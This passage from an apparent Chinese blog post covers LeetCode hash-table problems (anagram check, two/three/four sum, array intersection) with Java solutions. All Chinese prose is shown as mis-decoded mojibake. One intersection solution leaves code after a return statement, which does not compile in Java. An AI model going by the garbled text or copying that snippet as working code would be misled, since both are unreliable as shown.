å·²å­˜åœ¨</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä¸¤æ•°ä¹‹å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">complement</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(complement)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;map.get(complement), i&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        map.put(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No two sum solution&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span>[] count = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        count[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        count[t.charAt(i) - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> c : count) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä¸‰æ•°ä¹‹å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length &amp;&amp; nums[i] &lt;= <span class="number">0</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> || nums[i - <span class="number">1</span>] != nums[i]) &#123;</span><br><span class="line">            twoSumII(nums, i, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">twoSumII</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lo</span> <span class="operator">=</span> i + <span class="number">1</span>, hi = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[lo] + nums[hi];</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ++lo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            --hi;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.add(Arrays.asList(nums[i], nums[lo++], nums[hi--]));</span><br><span class="line">            <span class="keyword">while</span> (lo &lt; hi &amp;&amp; nums[lo] == nums[lo - <span class="number">1</span>])</span><br><span class="line">                ++lo;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å››æ•°ä¹‹å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">fourSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="keyword">return</span> kSum(nums, target, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">kSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target, <span class="type">int</span> start, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (start == nums.length || nums[start] * k &gt; target || target &gt; nums[nums.length - <span class="number">1</span>] * k)</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> twoSum(nums, target, start);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; ++i)</span><br><span class="line">        <span class="keyword">if</span> (i == start || nums[i - <span class="number">1</span>] != nums[i])</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> set : kSum(nums, target - nums[i], i + <span class="number">1</span>, k - <span class="number">1</span>)) &#123;</span><br><span class="line">                res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(nums[i])));</span><br><span class="line">                res.get(res.size() - <span class="number">1</span>).addAll(set);</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">lo</span> <span class="operator">=</span> start, hi = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[lo] + nums[hi];</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; target || (lo &gt; start &amp;&amp; nums[lo] == nums[lo - <span class="number">1</span>]))</span><br><span class="line">            ++lo;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target || (hi &lt; nums.length - <span class="number">1</span> &amp;&amp; nums[hi] == nums[hi + <span class="number">1</span>]))</span><br><span class="line">            --hi;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            res.add(Arrays.asList(nums[lo++], nums[hi--]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="242-æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯"><a href="#242-æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯" class="headerlink" title="242.æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯"></a>242.æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯</h2><p>ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² s å’Œ t ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­ t æ˜¯å¦æ˜¯ s çš„ å­—æ¯å¼‚ä½è¯ã€‚<br>ç¤ºä¾‹ 1:<br>è¾“å…¥: s &#x3D; â€œanagramâ€, t &#x3D; â€œnagaramâ€<br>è¾“å‡º: true</p><p>ç¤ºä¾‹ 2:<br>è¾“å…¥: s &#x3D; â€œratâ€, t &#x3D; â€œcarâ€<br>è¾“å‡º: false</p><p>æ•°ç»„å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•å“ˆå¸Œè¡¨ï¼Œè€Œä¸”è¿™é“é¢˜ç›®ä¸­å­—ç¬¦ä¸²åªæœ‰å°å†™å­—ç¬¦ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œæ¥è®°å½•å­—ç¬¦ä¸²sé‡Œå­—ç¬¦å‡ºç°çš„æ¬¡æ•°ã€‚éœ€è¦å®šä¹‰ä¸€ä¸ªå¤šå¤§çš„æ•°ç»„å‘¢ï¼Œå®šä¸€ä¸ªæ•°ç»„å«åšrecordï¼Œå¤§å°ä¸º26 å°±å¯ä»¥äº†ï¼Œåˆå§‹åŒ–ä¸º0ï¼Œå› ä¸ºå­—ç¬¦aåˆ°å­—ç¬¦zçš„ASCIIä¹Ÿæ˜¯26ä¸ªè¿ç»­çš„æ•°å€¼ã€‚<br>å®šä¹‰ä¸€ä¸ªæ•°ç»„å«åšrecordç”¨æ¥ä¸Šè®°å½•å­—ç¬¦ä¸²sé‡Œå­—ç¬¦å‡ºç°çš„æ¬¡æ•°ã€‚<br>éœ€è¦æŠŠå­—ç¬¦æ˜ å°„åˆ°æ•°ç»„ä¹Ÿå°±æ˜¯å“ˆå¸Œè¡¨çš„ç´¢å¼•ä¸‹æ ‡ä¸Šï¼Œå› ä¸ºå­—ç¬¦aåˆ°å­—ç¬¦zçš„ASCIIæ˜¯26ä¸ªè¿ç»­çš„æ•°å€¼ï¼Œæ‰€ä»¥å­—ç¬¦aæ˜ å°„ä¸ºä¸‹æ ‡0ï¼Œç›¸åº”çš„å­—ç¬¦zæ˜ å°„ä¸ºä¸‹æ ‡25ã€‚<br>å†éå† å­—ç¬¦ä¸²sçš„æ—¶å€™ï¼Œåªéœ€è¦å°† s[i] - â€˜aâ€™ æ‰€åœ¨çš„å…ƒç´ åš+1 æ“ä½œå³å¯ï¼Œå¹¶ä¸éœ€è¦è®°ä½å­—ç¬¦açš„ASCIIï¼Œåªè¦æ±‚å‡ºä¸€ä¸ªç›¸å¯¹æ•°å€¼å°±å¯ä»¥äº†ã€‚ è¿™æ ·å°±å°†å­—ç¬¦ä¸²sä¸­å­—ç¬¦å‡ºç°çš„æ¬¡æ•°ï¼Œç»Ÿè®¡å‡ºæ¥äº†ã€‚<br>é‚£çœ‹ä¸€ä¸‹å¦‚ä½•æ£€æŸ¥å­—ç¬¦ä¸²tä¸­æ˜¯å¦å‡ºç°äº†è¿™äº›å­—ç¬¦ï¼ŒåŒæ ·åœ¨éå†å­—ç¬¦ä¸²tçš„æ—¶å€™ï¼Œå¯¹tä¸­å‡ºç°çš„å­—ç¬¦æ˜ å°„å“ˆå¸Œè¡¨ç´¢å¼•ä¸Šçš„æ•°å€¼å†åš-1çš„æ“ä½œã€‚<br>é‚£ä¹ˆæœ€åæ£€æŸ¥ä¸€ä¸‹ï¼Œrecordæ•°ç»„å¦‚æœæœ‰çš„å…ƒç´ ä¸ä¸ºé›¶0ï¼Œè¯´æ˜å­—ç¬¦ä¸²så’Œtä¸€å®šæ˜¯è°å¤šäº†å­—ç¬¦æˆ–è€…è°å°‘äº†å­—ç¬¦ï¼Œreturn falseã€‚<br>æœ€åå¦‚æœrecordæ•°ç»„æ‰€æœ‰å…ƒç´ éƒ½ä¸ºé›¶0ï¼Œè¯´æ˜å­—ç¬¦ä¸²så’Œtæ˜¯å­—æ¯å¼‚ä½è¯ï¼Œreturn trueã€‚<br>æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œç©ºé—´ä¸Šå› ä¸ºå®šä¹‰æ˜¯çš„ä¸€ä¸ªå¸¸é‡å¤§å°çš„è¾…åŠ©æ•°ç»„ï¼Œæ‰€ä»¥ç©ºé—´å¤æ‚åº¦ä¸ºO(1)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] record = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            record[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; t.length(); i++)&#123;</span><br><span class="line">            record[t.charAt(i) - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> count: record)&#123;</span><br><span class="line">            <span class="keyword">if</span>(count != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨æ’åºçš„æ–¹æ³•åš</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.length() != t.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] str1 = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] str2 = t.toCharArray();</span><br><span class="line">        Arrays.sort(str1);</span><br><span class="line">        Arrays.sort(str2);</span><br><span class="line">        <span class="keyword">return</span> Arrays.equals(str1, str2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¶é—´å¤æ‚åº¦ï¼šO(nlogn)ï¼Œå…¶ä¸­ n ä¸º s çš„é•¿åº¦ã€‚æ’åºçš„æ—¶é—´å¤æ‚åº¦ä¸º O(nlogn)ï¼Œæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰æ—¶é—´å¤æ‚åº¦ä¸º O(n)ï¼Œå› æ­¤æ€»ä½“æ—¶é—´å¤æ‚åº¦ä¸º O(nlogn+n)&#x3D;O(nlogn)ã€‚<br>ç©ºé—´å¤æ‚åº¦ï¼šO(logn)ã€‚æ’åºéœ€è¦ O(logn) çš„ç©ºé—´å¤æ‚åº¦ã€‚æ³¨æ„ï¼Œåœ¨æŸäº›è¯­è¨€ï¼ˆæ¯”å¦‚ Java &amp; JavaScriptï¼‰ä¸­å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é¢å¤–çš„ O(n) çš„ç©ºé—´æ¥æ‹·è´å­—ç¬¦ä¸²ã€‚ä½†æ˜¯æˆ‘ä»¬å¿½ç•¥è¿™ä¸€å¤æ‚åº¦åˆ†æï¼Œå› ä¸ºï¼šè¿™ä¾èµ–äºè¯­è¨€çš„ç»†èŠ‚ï¼Œä¹Ÿå–å†³äºå‡½æ•°çš„è®¾è®¡æ–¹å¼ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥å°†å‡½æ•°å‚æ•°ç±»å‹æ›´æ”¹ä¸º char[]ã€‚</p><h2 id="349-ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†"><a href="#349-ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†" class="headerlink" title="349. ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†"></a>349. ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†</h2><p>ç»™å®šä¸¤ä¸ªæ•°ç»„ nums1 å’Œ nums2 ï¼Œè¿”å› å®ƒä»¬çš„ äº¤é›†ã€‚è¾“å‡ºç»“æœä¸­çš„æ¯ä¸ªå…ƒç´ ä¸€å®šæ˜¯ å”¯ä¸€ çš„ã€‚æˆ‘ä»¬å¯ä»¥ ä¸è€ƒè™‘è¾“å‡ºç»“æœçš„é¡ºåº ã€‚</p><ol><li>ä½¿ç”¨HashSetï¼šè®¡ç®—ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†ï¼Œç›´è§‚çš„æ–¹æ³•æ˜¯éå†æ•°ç»„ nums1ï¼Œå¯¹äºå…¶ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œéå†æ•°ç»„ nums2 åˆ¤æ–­è¯¥å…ƒç´ æ˜¯å¦åœ¨æ•°ç»„ nums2 ä¸­ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°†è¯¥å…ƒç´ æ·»åŠ åˆ°è¿”å›å€¼ã€‚å‡è®¾æ•°ç»„ nums1 å’Œ nums2 çš„é•¿åº¦åˆ†åˆ«æ˜¯ m å’Œ nï¼Œåˆ™éå†æ•°ç»„ nums1 éœ€è¦ O(m) çš„æ—¶é—´ï¼Œåˆ¤æ–­ nums1 ä¸­çš„æ¯ä¸ªå…ƒç´ æ˜¯å¦åœ¨æ•°ç»„ nums2 ä¸­éœ€è¦ O(n) çš„æ—¶é—´ï¼Œå› æ­¤æ€»æ—¶é—´å¤æ‚åº¦æ˜¯ O(mn)ã€‚<br>å¦‚æœä½¿ç”¨å“ˆå¸Œé›†åˆå­˜å‚¨å…ƒç´ ï¼Œåˆ™å¯ä»¥åœ¨ O(1) çš„æ—¶é—´å†…åˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­ï¼Œä»è€Œé™ä½æ—¶é—´å¤æ‚åº¦ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; resSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ•°ç»„1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// éå†æ•°ç»„2çœ‹å“ˆå¸Œè¡¨é‡Œæ˜¯å¦æœ‰</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i))&#123;</span><br><span class="line">                resSet.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//æ–¹æ³•1ï¼šå°†ç»“æœé›†åˆè½¬ä¸ºæ•°ç»„</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resSet.stream().mapToInt(x -&gt; x).toArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//æ–¹æ³•2ï¼šå¦å¤–ç”³è¯·ä¸€ä¸ªæ•°ç»„å­˜æ”¾setResä¸­çš„å…ƒç´ ,æœ€åè¿”å›æ•°ç»„</span></span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[resSet.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : resSet)&#123;</span><br><span class="line">            arr[j++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨Hashæ•°ç»„<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="type">int</span>[] hash1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="type">int</span>[] hash2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            hash1[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2)&#123;</span><br><span class="line">            hash2[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(hash1[i] &gt; <span class="number">0</span> &amp;&amp; hash2[i] &gt; <span class="number">0</span>)</span><br><span class="line">                resList.add(i);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> res[] = <span class="keyword">new</span> <span class="title class_">int</span>[resList.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : resList)</span><br><span class="line">            res[index++] = i;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>æ’åº + åŒæŒ‡é’ˆ<br>å¦‚æœä¸¤ä¸ªæ•°ç»„æ˜¯æœ‰åºçš„ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åŒæŒ‡é’ˆçš„æ–¹æ³•å¾—åˆ°ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†ã€‚<br>é¦–å…ˆå¯¹ä¸¤ä¸ªæ•°ç»„è¿›è¡Œæ’åºï¼Œç„¶åä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆéå†ä¸¤ä¸ªæ•°ç»„ã€‚å¯ä»¥é¢„è§çš„æ˜¯åŠ å…¥ç­”æ¡ˆçš„æ•°ç»„çš„å…ƒç´ ä¸€å®šæ˜¯é€’å¢çš„ï¼Œä¸ºäº†ä¿è¯åŠ å…¥å…ƒç´ çš„å”¯ä¸€æ€§ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–è®°å½•å˜é‡ pre è¡¨ç¤ºä¸Šä¸€æ¬¡åŠ å…¥ç­”æ¡ˆæ•°ç»„çš„å…ƒç´ ã€‚<br>åˆå§‹æ—¶ï¼Œä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘ä¸¤ä¸ªæ•°ç»„çš„å¤´éƒ¨ã€‚æ¯æ¬¡æ¯”è¾ƒä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘çš„ä¸¤ä¸ªæ•°ç»„ä¸­çš„æ•°å­—ï¼Œå¦‚æœä¸¤ä¸ªæ•°å­—ä¸ç›¸ç­‰ï¼Œåˆ™å°†æŒ‡å‘è¾ƒå°æ•°å­—çš„æŒ‡é’ˆå³ç§»ä¸€ä½ï¼Œå¦‚æœä¸¤ä¸ªæ•°å­—ç›¸ç­‰ï¼Œä¸”è¯¥æ•°å­—ä¸ç­‰äº pre ï¼Œå°†è¯¥æ•°å­—æ·»åŠ åˆ°ç­”æ¡ˆå¹¶æ›´æ–° pre 